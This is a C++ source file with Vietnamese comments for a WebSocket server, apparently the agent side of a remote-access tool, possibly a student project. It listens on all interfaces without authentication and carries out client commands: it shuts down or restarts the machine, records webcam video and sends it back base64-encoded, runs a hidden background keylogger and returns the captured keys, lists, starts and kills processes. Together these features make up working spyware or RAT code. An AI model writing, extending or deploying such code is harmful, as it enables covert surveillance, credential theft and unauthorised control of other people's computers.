// --- CAU HINH WINDOWS ---
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 
#endif

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/strand.hpp>
#include <cstdlib>      // Thu vien chua ham system() de chay lenh CMD
#include <iostream>
#include <string>
#include <thread>
#include <memory>
#include <vector>

#include "Process.h"
#include "Keylogger.h"
#include "Webcam.h"

// Tu dong link thu vien socket cua Windows
#pragma comment(lib, "ws2_32.lib")

namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;

// --- HAM HO TRO MA HOA BASE64 ---
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(const std::vector<char>& data) {
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    size_t dataLen = data.size();
    size_t dataPos = 0;

    while (dataLen--) {
        char_array_3[i++] = data[dataPos++];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; (i < 4); i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}

//------------------------------------------------------------------------------
// MODULE 2
//------------------------------------------------------------------------------

void DoShutdown();
void DoRestart();

//------------------------------------------------------------------------------
// LOGIC SERVER
//------------------------------------------------------------------------------

// Ham bao loi ra man hinh
void fail(beast::error_code ec, char const* what)
{
    std::cerr << what << ": " << ec.message() << "\n";
}

// Class dai dien cho mot phien ket noi (1 Client)
class session : public std::enable_shared_from_this<session>
{
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_; // Bo dem chua du lieu nhan duoc

public:
    // Constructor: Nhan socket tu listener
    explicit session(tcp::socket&& socket)
        : ws_(std::move(socket))
    {
    }

    // Bat dau chay phien lam viec
    void run()
    {
        // Thiet lap timeout (de phong treo ket noi)
        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));

        // Thuc hien bat tay WebSocket (Handshake)
        ws_.async_accept(
            beast::bind_front_handler(
                &session::on_accept,
                shared_from_this()));
    }

    void on_accept(beast::error_code ec)
    {
        if (ec) return fail(ec, "Accept Error");

        // Bat tay xong, bat dau doc tin nhan
        do_read();
    }

    void do_read()
    {
        // Doc tin nhan tu Client vao buffer_
        ws_.async_read(
            buffer_,
            beast::bind_front_handler(
                &session::on_read,
                shared_from_this()));
    }

    // --- XU LY TIN NHAN NHAN DUOC ---
    void on_read(beast::error_code ec, std::size_t bytes_transferred)
    {
        boost::ignore_unused(bytes_transferred);

        // Neu client ngat ket noi
        if (ec == websocket::error::closed) return;
        if (ec) return fail(ec, "Read Error");

        // Kiem tra xem tin nhan co phai la dang Text khong
        if (ws_.got_text())
        {
            // Chuyen du lieu tu Buffer sang String
            std::string command = beast::buffers_to_string(buffer_.data());

            std::cout << "RECEIVED COMMAND: " << command << "\n";
            static Keylogger myKeylogger;
            static Process myProcessModule;

            // Xu ly lenh 
            // 1. Xu ly Shutdown
            if (command == "shutdown")
            {
                ws_.text(true);
                ws_.write(net::buffer("Server: OK, shutting down in 15s..."));
                DoShutdown();
            }
            // 2. Xu ly Restart
            else if (command == "restart")
            {
                ws_.text(true);
                ws_.write(net::buffer("Server: OK, restarting in 15s..."));
                DoRestart();
            }
            // 3. Xu ly Capture Webcam
            else if (command == "capture")
            {
                // Thong bao truoc de Client khong tuong bi treo
                ws_.text(true);
                ws_.write(net::buffer("Server: OK, recording video (10s)... Please wait."));

                // Quay video (Mat 10 giay)
                std::vector<char> videoData = CaptureWebcam(10);

                if (!videoData.empty()) {
                    // Ma hoa Base64
                    std::string encoded = base64_encode(videoData);
                    
                    // Gui ve Client voi tien to "file"
                    // De Client JS hieu va tai xuong
                    std::string response = "file " + encoded;
                    
                    ws_.text(true);
                    ws_.write(net::buffer(response));
                    std::cout << "[SERVER] Video sent to Client.\n";
                }
                else {
                    ws_.text(true);
                    ws_.write(net::buffer("Server: Error recording video."));
                }
            }

            // 4. Xu li Keylogger
            else if (command == "start-keylog")
            {
                myKeylogger.StartKeyLogging();
                ws_.text(true);
                ws_.write(net::buffer("Server: Keylogger da bat dau (chay ngam)..."));
            }
            else if (command == "stop-keylog")
            {
                myKeylogger.StopKeyLogging();
                ws_.text(true);
                ws_.write(net::buffer("Server: Keylogger da dung lai."));
            }
            else if (command == "get-keylog")
            {
                // Lay du lieu phim da ghi duoc
                std::string logs = myKeylogger.GetLoggedKeys();

                if (logs.empty()) logs = "[Chua co phim nao duoc go]";

                ws_.text(true);
                // Gui du lieu ve Client
                ws_.write(net::buffer("KEYLOG_DATA:\n" + logs));
            }
            // 5. Xu li Process
             // Lenh "ps": Liet ke danh sach process
            else if (command == "ps")
            {
                std::string list = myProcessModule.ListProcesses();
                ws_.text(true);
                // Gui danh sach ve cho Client
                ws_.write(net::buffer(list));
            }
            // Lenh "start <ten app>": Mo chuong trinh
            // Vi du: start notepad.exe
            else if (command.rfind("start ", 0) == 0)
            {
                // Cat bo chu "start " (6 ky tu dau) de lay ten app
                std::string appName = command.substr(6);

                if (myProcessModule.StartProcess(appName)) {
                    ws_.text(true);
                    ws_.write(net::buffer("Server: Da mo thanh cong: " + appName));
                }
                else {
                    ws_.text(true);
                    ws_.write(net::buffer("Server: Loi! Khong the mo: " + appName));
                }
            }
            // Lenh "kill <ten app hoac PID>": Tat chuong trinh
            // Vi du: kill notepad.exe HOAC kill 1234
            else if (command.rfind("kill ", 0) == 0)
            {
                // Cat bo chu "kill " (5 ky tu dau) de lay ten app/PID
                std::string target = command.substr(5);

                // Goi ham Stop va lay thong bao loi/thanh cong tra ve
                std::string result = myProcessModule.StopProcess(target);

                ws_.text(true);
                ws_.write(net::buffer("Server: " + result));
            }

            // Lenh khong xac dinh
            else
            {
                ws_.text(true);
                ws_.write(net::buffer("Server: Unknown command!"));
            }
        }

        // Xoa bo dem cu de chuan bi nhan tin moi
        buffer_.consume(buffer_.size());

        // Tiep tuc vong lap doc
        do_read();
    }
};

//------------------------------------------------------------------------------

// Class lang nghe ket noi moi (Cong bao ve)
class listener : public std::enable_shared_from_this<listener>
{
    net::io_context& ioc_;
    tcp::acceptor acceptor_;

public:
    listener(net::io_context& ioc, tcp::endpoint endpoint)
        : ioc_(ioc), acceptor_(ioc)
    {
        beast::error_code ec;

        // Mo cong
        acceptor_.open(endpoint.protocol(), ec);
        if (ec) { fail(ec, "Open Error"); return; }

        // Cho phep dung lai dia chi IP
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        if (ec) { fail(ec, "Set Option Error"); return; }

        // Gan dia chi IP vao cong
        acceptor_.bind(endpoint, ec);
        if (ec) { fail(ec, "Bind Error"); return; }

        // Bat dau lang nghe
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { fail(ec, "Listen Error"); return; }
    }

    // Bat dau chap nhan ket noi
    void run() { do_accept(); }

private:
    void do_accept()
    {
        // Cho ket noi moi bat dong bo
        acceptor_.async_accept(
            net::make_strand(ioc_),
            beast::bind_front_handler(
                &listener::on_accept,
                shared_from_this()));
    }

    void on_accept(beast::error_code ec, tcp::socket socket)
    {
        if (ec)
        {
            fail(ec, "Accept Error");
        }
        else
        {
            // Tao phien lam viec moi (Session) cho ket noi nay
            std::make_shared<session>(std::move(socket))->run();
        }

        // Quay lai cho ket noi tiep theo
        do_accept();
    }
};

//------------------------------------------------------------------------------

int main()
{
    auto const address = net::ip::make_address("0.0.0.0");
    auto const port = static_cast<unsigned short>(8080);
    int const threads = 1;

    std::cout << "Starting WebSocket server...\n";
    std::cout << "Listening on ws://" << address.to_string() << ":" << port << "\n";
    std::cout << "----------------------------------\n";

    // Tao moi truong I/O
    net::io_context ioc{ threads };

    // Tao va chay listener
    std::make_shared<listener>(ioc, tcp::endpoint{ address, port })->run();

    // Chay vong lap su kien (Event Loop)
    ioc.run();

    return EXIT_SUCCESS;
}